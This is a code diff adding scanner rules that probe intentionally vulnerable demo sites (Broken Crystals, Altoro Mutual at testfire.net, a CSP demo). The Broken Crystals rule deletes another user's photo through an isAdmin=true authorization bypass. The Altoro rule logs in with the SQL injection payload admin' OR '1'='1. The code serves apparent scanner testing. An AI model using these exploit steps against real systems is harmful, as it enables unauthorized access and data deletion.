@@ -42772,6 +42772,212 @@ const brokencrystalsNestedJsonRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+async function brokencrystalsPhotoBflaVictimId(ctx: RuleContext): Promise<number | null> {
+  const searchUrl = new URL("/api/users/search/a", ctx.origin).toString();
+  const doc = await ctx.probe.get(searchUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  try {
+    const rows = JSON.parse(doc.body) as Array<{ id?: unknown }>;
+    const id = rows.find((row) => typeof row.id === "number" && row.id > 0)?.id;
+    return typeof id === "number" ? id : null;
+  } catch {
+    return null;
+  }
+}
+
+const brokencrystalsPhotoBflaLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const victimId = await brokencrystalsPhotoBflaVictimId(ctx);
+  if (!victimId) return NEGATIVE;
+  const email = `thugir-bfla-${Date.now()}-${Math.random().toString(36).slice(2, 8)}@thugir-probe.invalid`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/api/users/basic", ctx.origin).toString();
+  const createPayload = JSON.stringify({
+    email,
+    firstName: "Thugir",
+    lastName: "Probe",
+    company: "ProbeCo",
+    cardNumber: "0000",
+    phoneNumber: "000-0000",
+    password,
+    op: "basic"
+  });
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: createPayload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 300) return NEGATIVE;
+  const token = await brokencrystalsLoginToken(ctx, email, password);
+  if (!token) return NEGATIVE;
+  const deleteUrl = new URL(`/api/users/one/${victimId}/photo`, ctx.origin);
+  deleteUrl.searchParams.set("isAdmin", "true");
+  const deleteDoc = await ctx.probe.get(deleteUrl.toString(), {
+    method: "DELETE",
+    headers: { authorization: token },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (deleteDoc.status < 200 || deleteDoc.status >= 300) return NEGATIVE;
+  const deniedUrl = new URL(`/api/users/one/${victimId}/photo`, ctx.origin).toString();
+  const deniedDoc = await ctx.probe.get(deniedUrl, {
+    method: "DELETE",
+    headers: { authorization: token },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (deniedDoc.status >= 200 && deniedDoc.status < 300) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      victimId,
+      deleteUrl: deleteUrl.toString(),
+      deleteStatus: deleteDoc.status,
+      deniedStatus: deniedDoc.status,
+      snippet: deleteDoc.body.slice(0, 120).trim() || `HTTP ${deleteDoc.status}`,
+      note: "Broken Crystals DELETE /api/users/one/{id}/photo?isAdmin=true succeeds for non-admin JWT — BFLA photo-delete oracle"
+    }
+  };
+};
+
+const brokencrystalsPhotoBflaRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/photo/i.test(pageUrl) || !/[?&]isAdmin=true/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsPhotoBflaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/users/one/{id}/photo route scan — DELETE with isAdmin=true bypasses authorization for non-admin JWT — BFLA photo-delete oracle"
+    }
+  };
+};
+
+function isTestfireHost(ctx: RuleContext): boolean {
+  try {
+    return /(?:^|\.)testfire\.net$/i.test(new URL(ctx.origin).hostname);
+  } catch {
+    return /testfire\.net/i.test(ctx.origin);
+  }
+}
+
+const TESTFIRE_SQLI_LOGIN_PAYLOAD = "admin' OR '1'='1";
+
+const testfireLoginSqliLiveOracle: Rule = async (ctx) => {
+  if (!isTestfireHost(ctx)) return NEGATIVE;
+  const loginUrl = new URL("/doLogin", ctx.origin).toString();
+  const badBody = new URLSearchParams({
+    uid: "thugir-invalid-probe",
+    passw: "badpass",
+    btnSubmit: "Login"
+  }).toString();
+  const badDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: badBody,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 512,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const badLoc = badDoc.headers.location || "";
+  if (![301, 302, 303, 307, 308].includes(badDoc.status)) return NEGATIVE;
+  if (!/login\.jsp/i.test(badLoc)) return NEGATIVE;
+  const sqliBody = new URLSearchParams({
+    uid: TESTFIRE_SQLI_LOGIN_PAYLOAD,
+    passw: "x",
+    btnSubmit: "Login"
+  }).toString();
+  const sqliDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: sqliBody,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 512,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const sqliLoc = sqliDoc.headers.location || "";
+  const altoroCookie = Object.entries(sqliDoc.headers).some(
+    ([key, value]) => /set-cookie/i.test(key) && /altoroaccounts/i.test(String(value))
+  );
+  if (![301, 302, 303, 307, 308].includes(sqliDoc.status)) return NEGATIVE;
+  if (!/\/bank\/main\.jsp/i.test(sqliLoc)) return NEGATIVE;
+  if (!altoroCookie) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: loginUrl,
+      payload: TESTFIRE_SQLI_LOGIN_PAYLOAD,
+      redirect: sqliLoc.slice(0, 120),
+      badRedirect: badLoc.slice(0, 120),
+      note: "Altoro Mutual POST /doLogin with admin' OR '1'='1 redirects to /bank/main.jsp with AltoroAccounts session — SQL injection authentication bypass oracle"
+    }
+  };
+};
+
+const testfireLoginSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTestfireHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/login\.jsp/i.test(pageUrl)) return NEGATIVE;
+  const result = await testfireLoginSqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Altoro Mutual /login.jsp route scan — POST /doLogin SQLi payload redirects to /bank/main.jsp — SQL injection authentication bypass oracle"
+    }
+  };
+};
+
+function isEuriSecCspHost(ctx: RuleContext): boolean {
+  return /euri-sec-csp/i.test(ctx.origin) || /content security policy demo/i.test(ctx.combined);
+}
+
+const euriSecCspDynamicScriptLiveOracle: Rule = async (ctx) => {
+  if (!isEuriSecCspHost(ctx)) return NEGATIVE;
+  const contentUrl = new URL("/csp/ecommerce-content/", ctx.origin).toString();
+  const doc = await ctx.probe.get(contentUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!/document\.createElement\(\s*["']script["']\s*\)/i.test(doc.body)) return NEGATIVE;
+  if (!/googletagmanager\.com/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url: contentUrl,
+      snippet: doc.body.match(/document\.createElement\([^)]+\)[\s\S]{0,120}googletagmanager\.com[^'"]*/i)?.[0]?.slice(0, 200) || doc.body.slice(0, 200).trim(),
+      note: "EuriSec CSP demo /csp/ecommerce-content/ dynamically injects googletagmanager.com scripts via document.createElement — unsafe inline script oracle for CSP training"
+    }
+  };
+};
+
+const euriSecCspDynamicScriptRouteLiveOracle: Rule = async (ctx) => {
+  if (!isEuriSecCspHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/ecommerce(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const result = await euriSecCspDynamicScriptLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "EuriSec CSP demo /ecommerce route scan — iframe content dynamically injects external GTM scripts without nonce — CSP misconfiguration training oracle"
+    }
+  };
+};
+
 const brokencrystalsHiddenUploadLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const uploadUrl = new URL("/api/hidden-upload", ctx.origin).toString();
@@ -46428,6 +46634,12 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsDomCsrfRouteLiveOracle,
   brokencrystalsNestedJsonDoSLiveOracle,
   brokencrystalsNestedJsonRouteLiveOracle,
+  brokencrystalsPhotoBflaLiveOracle,
+  brokencrystalsPhotoBflaRouteLiveOracle,
+  testfireLoginSqliLiveOracle,
+  testfireLoginSqliRouteLiveOracle,
+  euriSecCspDynamicScriptLiveOracle,
+  euriSecCspDynamicScriptRouteLiveOracle,
   brokencrystalsSecretsLiveOracle,
   brokencrystalsSecretsRouteLiveOracle,
   brokencrystalsSafeFilesRfiLiveOracle,
